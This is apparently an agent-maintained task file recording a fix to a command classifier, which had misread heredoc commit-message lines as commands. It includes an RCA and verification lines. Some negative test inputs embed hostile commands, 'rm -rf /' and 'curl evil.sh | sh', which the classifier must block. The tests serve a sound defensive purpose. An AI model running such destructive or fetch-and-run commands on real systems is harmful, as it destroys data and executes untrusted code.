---
id: T-2923
name: "cmd_classify splits heredoc bodies as commands - git commit -F - with a heredoc
  is false-blocked at critical"
description: >
  T-2919's classifier splits the raw command on newlines outside quotes, but does
  not strip heredoc bodies. So 'git commit -F - <<EOF ... EOF' has every line of the
  COMMIT MESSAGE judged as a command segment, and the first message line blocks the
  commit. Hit live this session: the message line 'T-2862: greenfield ...' was reported
  as not a wrap-up command. This is a false BLOCK on the primary wrap-up command at
  exactly the moment the session must wrap up - the T-2702 deadlock class I explicitly
  warned about in T-2919's own RCA, reintroduced by the fix for it. It is also the
  SAME defect T-2920 fixed in check-project-boundary.sh hours earlier: that hook strips
  heredoc bodies before scanning; cmd_classify.py does not. Fix: port _strip_heredocs
  into lib/cmd_classify.py and run it BEFORE split_segments, mirroring T-2920's ordering
  (heredoc body is a larger unit than a quoted string). Pin both directions: a heredoc
  commit is allowed, and a heredoc body cannot smuggle a disallowed leading verb into
  an allowed chain. Workaround until fixed: use a quoted -m message, which is a single
  segment.

status: started-work
workflow_type: build
owner: agent
horizon: now
tags: []
components: []
related_tasks: []
# arc_id:                         # T-1849: optional — slug (e.g. "arc-grooming") OR arc-NNN (e.g. "arc-005")
#                                 # When set, must resolve to .context/arcs/<id>.yaml; PreToolUse hook
#                                 # (check-arc-id) blocks save under agent control if it doesn't resolve.
#                                 # Empty/missing → unassigned (allowed). See CLAUDE.md §Task System.
# demo_target: true               # T-2286: optional — marks task as reserved for an orchestrated demo
#                                 # worker (e.g. arc-010 HM-A dispatches via mcp__fw__work_on). When set,
#                                 # `fw work-on T-XXX` refuses unless --i-am-demo-orchestrator (CLI) or
#                                 # FW_I_AM_DEMO_ORCHESTRATOR=1 (env) is passed. Prevents the parent
#                                 # session from consuming the captured→started-work transition the demo
#                                 # worker expects to drive. Origin OBS-057.
created: 2026-08-11T15:44:31Z
last_update: 2026-08-11T16:31:44Z
date_finished:
# revisit_at: YYYY-MM-DD          # T-1451: set on DEFER decisions to enable G-053 daily revisit scan
# revisit_evidence_needed:        # T-1451: one-line description of what evidence makes the revisit actionable
# ── BVP scoring fields (T-1918, arc-006). See docs/reports/T-1915-bvp-inception.md for semantics. ──
# bvp_scores:                     # confirmed per-driver scores 0-5, set by `fw bvp confirm` (T-1924).
#                                 # Sovereignty boundary — only set after human or agent confirmation.
#                                 # Shape: {D1: <int 0-5>, D2: <int 0-5>, D3: <int 0-5>, D4: <int 0-5>, [<free-driver-id>: <int>]...}
# bvp_scores_proposed:            # estimator-proposed scores (T-1922 worker). Persists when ≥2 delta
#                                 # from bvp_scores: on any driver (M3 v2-delta). Shape: list of timestamped entries.
# cost_estimate:                  # F8 composite: 0.6×blast_radius + 0.3×tier + 0.1×effort.
#                                 # Q2 fallback: T-shirt S/M/L/XL mapped to 2/4/6/8 when blast_radius is not yet computable.
cost_estimate_proposed:
  - ts: '2026-08-11T16:00:07Z'
    estimator: bvp-estimator-v1-heuristic
    cost_estimate:
      blast_radius: 0
      tier: 2
      effort: 7
    rationale: blast_radius=0 (no-signal); tier=2 (no-signal); effort=7 
      (no-signal)
    rubric_sha: e4a00f38e801
bvp_scores_proposed:
  - ts: '2026-08-11T16:00:13Z'
    estimator: bvp-estimator-v1-heuristic
    scores:
      D1: 4
      D2: 0
      D3: 3
      D4: 2
      F-RECALL: 0
      F-AUTONOMY: 0
      F3: 0
      F1: 0
      F2: 0
    rationale: D1=4 (body:structural-gate); D2=0 (no-signal); D3=3 
      (body:component-discoverability); D4=2 (body:env-class-handled); 
      F-RECALL=0 (no-signal); F-AUTONOMY=0 (no-signal); F3=0 (no-signal); F1=0 
      (no-signal); F2=0 (no-signal)
    rubric_sha: e4a00f38e801
---

# T-2923: cmd_classify splits heredoc bodies as commands - git commit -F - with a heredoc is false-blocked at critical

## Context

T-2919's classifier judges every newline-separated segment of a command; a
heredoc body is newline-separated text outside shell quotes, so `git commit -F -`
with a heredoc had its commit MESSAGE judged as commands and was refused at
critical. Found by the gate blocking its own author's commit, four hours after
T-2920 fixed the identical class in `check-project-boundary.sh`.

## Decisions

### 2026-08-11 — two deliberate divergences from the boundary hook's stripper

- **Chose:** blank the heredoc TERMINATOR line as well as the body, and only
  recognise the `<<` operator when it occurs OUTSIDE quotes.
- **Why:** the two hooks ask different questions over the same substrate, so a
  byte-for-byte port is wrong in both directions. (1) `check-project-boundary.sh`
  scans for path patterns, where a leftover `EOF` token is inert; this module
  judges every segment's leading verb, so a bare `EOF` segment matches no allowed
  verb and would have kept blocking the very commit we are permitting — the fix
  would have looked applied and changed nothing. (2) The boundary hook's operator
  regex runs over the raw string, so a quoted mention (`git commit -m "see
  <<EOF"`) followed later by a stray `EOF` line opens a phantom region that
  blanks the real commands between them. That is a false ALLOW, the silent
  direction, and it would have been introduced *by* the fix for a false block.
- **Rejected:** a straight copy of `_strip_heredocs`. Verified rather than
  assumed: the terminator-line case was caught by running the ported function
  before writing the suite, not by reading it.

## Acceptance Criteria

### Agent
<!-- Criteria the agent can verify (code, tests, commands). P-010 gates on these. -->
- [x] Defect reproduced against the SHIPPING file before any fix — both heredoc
      forms (`<<'EOF'` quoted, `<<EOF` bare) classified `blocked`, with the block
      reason naming a line of the commit MESSAGE rather than a command
- [x] `_strip_heredocs` ported into `lib/cmd_classify.py` and called BEFORE
      `strip_comments` and `split_segments` (T-2920 ordering: the heredoc body is
      a larger unit than a quoted string, so it must be removed first)
- [x] Both heredoc forms classify `allowed` after the fix
- [x] A real command AFTER the heredoc terminator still blocks — the stripper
      removes the body and nothing else
- [x] A heredoc body cannot smuggle a disallowed leading verb into an allowed
      chain (body is blanked, so it is neither command nor alibi)
- [x] An UNTERMINATED heredoc fails closed (blocks), not open
- [x] T-2919's suite still green — all 22 legs, including the 9 probe cases and
      both of 832's negative controls (`npm run build`, `python3 train.py` stay
      blocked). A fix in the over-permissive direction is worse than the defect.
- [x] Anti-vacuity leg present: the pre-fix behaviour is reconstructed and
      REQUIRED to bite, so a suite that stops exercising the defect goes red
- [x] Vendored copies refreshed (`bin/fw vendor self`) — consumers pulling the
      new `cmd_classify.py` without it would import-fail into degraded mode

### Human
<!-- Criteria requiring human verification (UI/UX, subjective quality). Not blocking.
     Remove this section if all criteria are agent-verifiable.
     Each criterion MUST include Steps/Expected/If-not so the human can act without guessing.

     ── Prefix routing (T-1811, T-1878): default to [REVIEWER] if Expected is grep-able ──
     If your Expected clause is grep-able / file-exists / structural (a deterministic
     shell check), prefer [REVIEWER] — that AC should be an Agent AC with the reviewer
     command in `## Verification` instead of a Human AC here. Only keep [REVIEW] if
     verification genuinely needs human taste (tone, feel, layout rhythm).
     See CLAUDE.md §AC Classification Guidance for the conversion rule.

     [REVIEW] example (genuine human judgment):
       - [ ] [REVIEW] Dashboard renders correctly
         **Steps:**
         1. Open https://example.com/dashboard in browser
         2. Verify all panels load within 2 seconds
         3. Check browser console for errors
         **Expected:** All panels visible, no console errors
         **If not:** Screenshot the broken panel and note the console error

     [REVIEWER] example (static-scan-verifiable — convert to Agent AC + Verification):
       - [ ] [REVIEWER] Block message names both bypass mechanisms
         **Steps:**
         1. Run `bin/fw reviewer T-XXX`
         **Expected:** Verdict: PASS; no findings on `block-message-completeness`
         **If not:** Inspect hook block-message string and add missing mechanism
       Conversion: this AC should be moved to ### Agent and
       `bin/fw reviewer T-XXX 2>&1 | grep -q "Overall:.*PASS"` added to ## Verification.
-->

## Verification

# Shell commands that MUST pass before work-completed. One per line.
# Lines starting with # are comments (skipped). Empty lines ignored.
# The completion gate runs each command — if any exits non-zero, completion is blocked.
#
# Toolchain hint (L-291): if you edited *.vbproj/*.csproj/*.xaml add `dotnet build`;
# *.go → `go build ./...`; Cargo.toml → `cargo check`; tsconfig.json → `tsc --noEmit`;
# pom.xml → `mvn -q compile`. P-011 runs only what you write — broken builds slip
# past otherwise (origin: 003-NTB-ATC-Plugin T-077, broken WPF DLL on master 5 days).
#
# Pipefail/SIGPIPE hint (L-387): P-011 runs each command under `set -eo pipefail`.
# `cmd | grep -q PATTERN` exits 141 (SIGPIPE) when grep matches and closes stdin
# while the upstream is still writing — verification then "fails" even though
# the pattern was present. Safe pattern: capture first, grep the capture:
#     out=$(cmd 2>&1); echo "$out" | grep -q "PATTERN"
# Or:
#     cmd > /tmp/.out 2>&1 && grep -q "PATTERN" /tmp/.out
# Origin: L-387, captured 4× (T-1716, T-1838, T-1862, T-1863) before this hint.
#
# Single pipe only — no intermediate tail/awk/sed stages between capture and grep
# (T-2090): `echo "$out" | tail -3 | grep -q PAT` re-introduces the SIGPIPE risk
# the capture step closed off — the middle stage is what `grep -q` slams its
# stdin on. grep scans the whole captured string anyway, so the tail-3 was
# cosmetic. Drop it: `echo "$out" | grep -q PAT`.
#
# AND ONLY WHILE THE CAPTURE IS SMALL (T-2743). The two hints above are correct
# for the captures they were written about, and both invert above the pipe
# buffer. `echo "$out" | grep -q PAT` is NOT SIGPIPE-free — it is SIGPIPE-free
# only while "$out" fits in the 65536-byte pipe buffer. Above that, with an
# early match: echo blocks on the full pipe, grep -q exits, echo takes SIGPIPE,
# pipeline exits 141 under pipefail — the exact failure L-387 exists to prevent.
# Measured: a Watchtower page is 146,366 bytes, rc=141 on 3/3 runs, deterministic
# not racy. Any line that curls a rendered page is exposed (routes run 50-200KB).
# For anything that might be large, redirect to a file:
#     cmd -o /tmp/.out && grep -q "PATTERN" /tmp/.out
#     curl -sf "$(bin/fw watchtower url)/page" -o /tmp/.out && grep -q "PAT" /tmp/.out
# This is the better default even when size is not a concern: `&&` keeps the
# PRODUCING command's exit code in the verdict, where `out=$(cmd)` discards it —
# the T-2738 problem one layer down. A 404 from curl fails the line instead of
# silently producing an empty capture for grep to not-match.
#
# REHEARSING A LINE BY HAND DOES NOT REHEARSE THE GATE (T-2743). Your interactive
# shell has no `set -eo pipefail`. The line above returned 0 when run by hand and
# 141 under P-011, from the same directory, the same second. To rehearse for real:
#     bash -c 'set -eo pipefail; <your verification line>'
#
# BUT NOT for a test runner (T-2738): the capture above discards the command's
# exit code, and `set -e` is suppressed inside the `if` condition the gate runs
# each line in — so in `cmd1; cmd2` only cmd2 is the verdict. For pytest/bats
# that exit code WAS the verdict, and the pass marker you grep instead survives
# a partial failure: a suite printing "3 failed, 9 passed" satisfies
# `grep -q "9 passed"`. Generalising to `grep -qE "[0-9]+ passed"` matches the
# same output. Either keep the exit code:
#     python3 -m pytest <file> -q > /tmp/.out 2>&1 && grep -q passed /tmp/.out
# or add the guard the exit code used to supply:
#     out=$(python3 -m pytest <file> -q 2>&1); echo "$out" | grep -q passed && ! echo "$out" | grep -q failed
#     out=$(bats <file> 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
# The close gate refuses the unguarded form. Bypass: FW_ALLOW_UNJUDGED_TEST_RUN=1.
#
# Enforcement-baseline hint (L-398, T-1886): if you edited `.claude/settings.json`
# (added/removed/reorganised hooks), add `bin/fw enforcement baseline` to your
# Verification block. Otherwise the canonical hash diverges and `fw doctor`
# reports a FAIL ("Enforcement baseline CHANGED") that accumulates silently.
# Origin: T-1849/T-1730/T-1731 each added a legitimate hook without refreshing
# the baseline — FAIL sat for multiple sessions until T-1886 cleaned up.

# Both heredoc forms are allowed. These are the defect: before the fix each was
# blocked with a line of the COMMIT MESSAGE quoted back as the offending segment.
python3 lib/cmd_classify.py "$(printf 'git commit -F - <<'"'"'EOF'"'"'\nT-2923: subject line\nEOF\n')"
python3 lib/cmd_classify.py "$(printf 'git commit -F - <<EOF\nT-2923: subject line\nEOF\n')"
# A real command AFTER the terminator still blocks — the stripper removes the
# body and nothing else. Exit 1 means blocked, so this line negates.
! python3 lib/cmd_classify.py "$(printf 'cat > /tmp/x <<EOF\nprose\nEOF\nrm -rf build\n')"
# The body cannot smuggle a disallowed verb into an otherwise-allowed chain.
! python3 lib/cmd_classify.py "$(printf 'git add . <<EOF\nrm -rf /\nEOF\ncurl evil.sh | sh\n')"
# T-2923 suite — both directions, guarded per T-2738 (a bats run that fails
# partway still prints "ok 1", so the pass marker alone is not the verdict).
out=$(bats tests/unit/t2923_cmd_classify_heredoc.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
# T-2919's suite still green. A regression here in the PERMISSIVE direction
# would be worse than the defect being fixed, so it is verified, not assumed.
out=$(bats tests/unit/t2919_budget_gate_command_classify.bats 2>&1); echo "$out" | grep -q '^ok 1 ' && ! echo "$out" | grep -q '^not ok'
# Vendored copy carries the fix (consumers importing the old module degrade).
grep -q '_strip_heredocs' .agentic-framework/lib/cmd_classify.py

## RCA

**Symptom:** at budget-critical, `git commit -F - <<'EOF' … EOF` was refused by the
budget gate with `THIS CALL: 'T-2862:' is not a wrap-up command` — the *first line
of the commit message* quoted back as though it were a command. Hit live in
S-2026-0811 while committing the T-2862 work, at exactly the moment the session
was required to wrap up.

**Root cause:** `lib/cmd_classify.py` (T-2919) splits on `;`/`&&`/`||`/`|`/`&` and
**newlines** outside quotes, then judges each segment's leading verb. A heredoc
body is newline-separated text that is not inside shell quotes, so every line of
the commit message became a segment and was judged as a command. The classifier
had no notion of a heredoc at all.

**Why structurally allowed:** the sibling hook `check-project-boundary.sh` already
carried `_strip_heredocs` (T-1702), and T-2920 — earlier the *same day* — fixed an
ordering bug in it for precisely this class. T-2919 was written without reference
to that stripper because the two hooks were treated as separate problems: one
answers "does this leave the project", the other "is this wrap-up". They are
different questions over the *same* substrate, and any predicate scanning a raw
command string inherits the same obligation to know where the command ends and
its data begins. Nothing in the repo expressed that shared obligation, so the
knowledge existed in one file and not the other.

Second-order: T-2919's own RCA explicitly names the T-2702 deadlock class ("if the
fix over-blocks it starts refusing the exact commands its own block message tells
the agent to run") and its suite pins the *printed* wrap-up remedies. It did not
pin the wrap-up commands the framework actually uses — and `git commit -F -` with
a heredoc is the shape CLAUDE.md's own multi-line commit guidance produces. The
suite tested the remedies the gate *advertises*, not the ones the session *runs*.

**Prevention:** the ordering is pinned in source and in `tests/unit/t2923_*.bats`
in both directions, mirroring T-2920's suite shape. The anti-vacuity leg
reconstructs the pre-fix newline-split and requires it to bite, so a future
refactor that stops exercising heredocs goes red rather than silently green.
Beyond this fix, the class itself is now named: L-576 (mention-vs-instance) plus
the corollary this task adds — **a predicate that scans a raw command string must
first remove the regions of that string which are data, and every such predicate
in the repo owes the same treatment.** Three hooks have now been caught
(check-project-boundary T-2920, budget-gate T-2919/T-2923, and 832's census
classifier); the remaining command-scanning hooks are unaudited, which is filed
as a separate observation rather than claimed as covered here.

<!-- REQUIRED for bug-class tasks (workflow_type=build with bug-tag, OR title matches
     fix/bug/rca/broken/crash/error/regression/fail/hotfix).
     Non-bug-class tasks may leave this section empty or remove it.

     For bug-class, fill in:
       **Symptom:** what was observed (the user-facing manifestation).
       **Root cause:** the specific structural/logical gap — not "the code was wrong".
       **Why structurally allowed:** what in the framework/code/tooling let this go undetected.
       **Prevention:** what catches the next instance (test/lint/gate/doc/learning) — distinct from the fix itself.

     The completion gate (T-1550, G-019) blocks --status work-completed when
     bug-class AND this section is empty/template-only. Use --skip-rca to bypass (logged).
-->

## Evolution

<!-- REQUIRED for arc-tagged build tasks (tags include arc:*). Captures how
     understanding evolved during build — what was learned that wasn't known at
     filing, what in the original plan no longer fits, what triggered pivots
     or new sub-tasks. Mandatory at slice boundaries (when applicable) and
     before --status work-completed.

     Origin: T-1717 grill Q4 — "the understanding of what we need and want
     evolves with the process of materialisation." Structural counter to §ACD:
     spec-vs-build divergence is logged as soon as it happens, not lost as
     folklore.

     Format (one entry per slice boundary or significant insight):
       ### YYYY-MM-DD — [topic]
       - **What changed:** [what we learned that we didn't know at filing]
       - **Plan impact:** [what in the plan no longer fits]
       - **Triggered:** [new sub-task / pivot / scope cut, with task ID if filed]

     The completion gate (T-1718) blocks --status work-completed when this
     section exists but is empty/template-only. Use --skip-evolution to bypass
     (logged Tier-2). Non-arc tasks may leave this empty.
-->

## Decisions

<!-- Record decisions ONLY when choosing between alternatives.
     Skip for tasks with no meaningful choices.
     Format:
     ### [date] — [topic]
     - **Chose:** [what was decided]
     - **Why:** [rationale]
     - **Rejected:** [alternatives and why not]
-->

## Decision

<!-- Filled at completion of inception tasks via:
     fw inception decide T-XXX go|no-go|defer --rationale "..."

     For non-inception tasks this section is ignored. Kept in template
     so `fw inception decide` (lib/inception.sh) finds the anchor heading
     without auto-creating; T-1832 added auto-create as fallback for
     legacy tasks lacking this section. -->

## Updates

### 2026-08-11T15:44:31Z — task-created [task-create-agent]
- **Action:** Created task via task-create agent
- **Output:** /opt/999-Agentic-Engineering-Framework/.tasks/active/T-2923-cmdclassify-splits-heredoc-bodies-as-com.md
- **Context:** Initial task creation

### 2026-08-11T16:31:44Z — status-update [task-update-agent]
- **Change:** status: captured → started-work
